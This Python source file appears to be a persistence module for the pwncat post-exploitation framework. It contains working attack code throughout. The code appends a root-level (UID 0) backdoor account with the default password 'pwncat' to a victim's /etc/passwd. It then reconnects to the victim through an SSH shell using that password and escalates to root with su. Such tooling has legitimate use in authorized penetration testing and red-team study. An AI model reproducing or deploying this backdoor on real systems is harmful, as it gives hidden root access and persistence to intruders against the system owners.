#!/usr/bin/env python3
import socket
import crypt

import paramiko

import pwncat
from pwncat.modules import Argument, Status, PersistType, PersistError
from pwncat.modules.persist import PersistModule


class Module(PersistModule):
    """
    Install a backdoor user (w/ UID=0) in `/etc/passwd` with our backdoor
    password. This allows reconnection if SSH allows password auth
    and privilege escalation locally with `su`.
    """

    TYPE = PersistType.LOCAL
    ARGUMENTS = {
        **PersistModule.ARGUMENTS,
        "backdoor_user": Argument(
            str, default="pwncat", help="The name of the new user to add"
        ),
        "backdoor_pass": Argument(
            str, default="pwncat", help="The password for the new user"
        ),
        "shell": Argument(
            str, default="current", help="The shell to assign for the user"
        ),
    }
    PLATFORM = pwncat.platform.Platform.LINUX

    def install(self, user, backdoor_user, backdoor_pass, shell):
        """ Install this module """

        # Hash the password
        hashed = crypt.crypt(backdoor_pass)

        if shell == "current":
            shell = pwncat.victim.shell

        try:
            with pwncat.victim.open("/etc/passwd", "r") as filp:
                passwd = filp.readlines()
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistError(str(exc))

        passwd.append(f"{backdoor_user}:{hashed}:0:0::/root:{shell}\n")
        passwd_content = "".join(passwd)

        try:
            with pwncat.victim.open(
                "/etc/passwd", "w", length=len(passwd_content)
            ) as filp:
                filp.write(passwd_content)
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistError(str(exc))

        # Reload the user database
        pwncat.victim.reload_users()

    def remove(self, user, backdoor_user, backdoor_pass, shell):
        """ Remove this module """

        if user != "root":
            raise PersistError("only root persistence is possible")

        # Hash the password
        hashed = crypt.crypt(backdoor_pass)

        if shell == "current":
            shell = pwncat.victim.shell

        try:
            with pwncat.victim.open("/etc/passwd", "r") as filp:
                passwd = filp.readlines()
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistError(str(exc))

        for i in range(len(passwd)):
            entry = passwd[i].split(":")
            if entry[0] == backdoor_user:
                passwd.pop(i)
                break
        else:
            return

        passwd_content = "".join(passwd)

        try:
            with pwncat.victim.open(
                "/etc/passwd", "w", length=len(passwd_content)
            ) as filp:
                filp.write(passwd_content)
        except (PermissionError, FileNotFoundError) as exc:
            raise PersistError(str(exc))

        # Reload the user database
        pwncat.victim.reload_users()

    def connect(self, host: pwncat.db.Host, user, backdoor_user, backdoor_pass, shell):

        try:
            yield Status("connecting to host")
            # Connect to the remote host's ssh server
            sock = socket.create_connection((host.ip, 22))
        except Exception as exc:
            raise PersistError(str(exc))

        # Create a paramiko SSH transport layer around the socket
        yield Status("wrapping socket in ssh transport")
        t = paramiko.Transport(sock)
        try:
            t.start_client()
        except paramiko.SSHException:
            raise PersistError("ssh negotiation failed")

        # Attempt authentication
        try:
            yield Status("authenticating with victim")
            t.auth_password(backdoor_user, backdoor_pass)
        except paramiko.ssh_exception.AuthenticationException:
            raise PersistError("incorrect password")

        if not t.is_authenticated():
            t.close()
            sock.close()
            raise PersistError("incorrect password")

        # Open an interactive session
        chan = t.open_session()
        chan.get_pty()
        chan.invoke_shell()

        yield chan

    def escalate(self, user, backdoor_user, backdoor_pass, shell):
        """ Utilize this module to escalate """

        pwncat.victim.run(f"su {backdoor_user}", wait=False)
        pwncat.victim.recvuntil(": ")
        pwncat.victim.client.send(backdoor_pass.encode("utf-8") + b"\n")
        pwncat.victim.update_user()
